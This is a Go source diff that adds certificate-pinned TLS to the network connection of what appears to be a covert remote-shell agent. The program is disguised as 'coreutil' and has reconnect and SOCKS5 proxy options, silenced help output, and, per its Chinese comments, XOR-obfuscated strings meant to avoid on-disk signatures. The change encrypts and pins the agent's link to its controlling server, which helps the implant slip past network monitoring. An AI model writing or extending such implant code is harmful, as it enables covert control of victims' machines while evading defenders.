@@ -19,6 +19,8 @@ import (
 	"time"
 
 	"coreutil/internal/proto"
+	"coreutil/internal/tlsx"
+	"crypto/tls"
 )
 
 var (
@@ -28,6 +30,8 @@ var (
 	reconnect  = flag.Int("r", 10, "")
 	proxyAddr  = flag.String("proxy", "", "")
 	quiet      = flag.Bool("q", false, "")
+	tlsEnable  = flag.Bool("tls", false, "")
+	tlsPin     = flag.String("pin", "", "")
 )
 
 // obf: 关键串异或混淆（key 循环），运行时解密 — 避免明文特征落盘
@@ -264,10 +268,30 @@ func shellArg() string {
 
 // dial 按配置走 socks5 代理或直连
 func dial() (net.Conn, error) {
+	var conn net.Conn
+	var err error
 	if *proxyAddr != "" {
-		return socks5Dial(*proxyAddr, *serverAddr)
+		conn, err = socks5Dial(*proxyAddr, *serverAddr)
+	} else {
+		conn, err = net.DialTimeout("tcp", *serverAddr, 10*time.Second)
 	}
-	return net.DialTimeout("tcp", *serverAddr, 10*time.Second)
+	if err != nil {
+		return nil, err
+	}
+	if *tlsEnable {
+		cfg, cerr := tlsx.ClientConfig(*tlsPin)
+		if cerr != nil {
+			conn.Close()
+			return nil, cerr
+		}
+		tc := tls.Client(conn, cfg)
+		if err := tc.Handshake(); err != nil {
+			conn.Close()
+			return nil, err
+		}
+		return tc, nil
+	}
+	return conn, nil
 }
 
 // handleConn 处理一次连接生命周期
@@ -309,6 +333,9 @@ func main() {
 	flag.Usage = func() {} // 静默帮助
 	if *serverAddr == "" || *token == "" {
 		os.Exit(1)
+	}
+	if *tlsEnable && *tlsPin == "" {
+		os.Exit(1) // TLS 需 -pin <server 证书指纹>
 	}
 	if *agentID == "" {
 		*agentID = genID()
